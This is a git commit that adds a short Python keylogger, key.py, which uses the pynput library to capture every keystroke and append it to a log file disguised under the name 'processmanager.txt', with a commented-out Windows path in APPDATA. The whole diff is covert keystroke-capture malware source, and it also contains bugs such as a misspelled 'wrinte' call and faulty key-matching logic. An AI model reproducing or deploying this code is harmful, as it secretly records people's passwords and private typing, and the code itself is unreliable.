fc5e0b6767ba4541bb5713214a96267225f5717d
Andrei <zenin.an@do-student.ru>
2023-04-17 07:31:29 +0300

    added keylogger

---
+++ keylogger/key.py
@@ -0,0 +1,37 @@
+import os
+from pynput.keyboard import Listener
+
+keys = []
+count = 0
+# path = os.environ['appdata'] + '\\processmanager.txt' #for windows
+path = 'processmanager.txt' #for linux
+
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count += 1
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+    
+def write_file(keys):
+    with open(path, 'a') as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find('backspace') > 0:
+                f.write(' backspace ')
+            elif k.find('enter') > 0:
+                f.wrinte('\n')
+            elif k.find('shift') > 0:
+                f.write(' shift ')
+            elif k.find('space') > 0:
+                f.write(' ')
+            elif k.find('caps_lock') > 0:
+                f.write(' caps_lock ')
+            elif k.find('Key'):
+                f.write(k)
+            
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
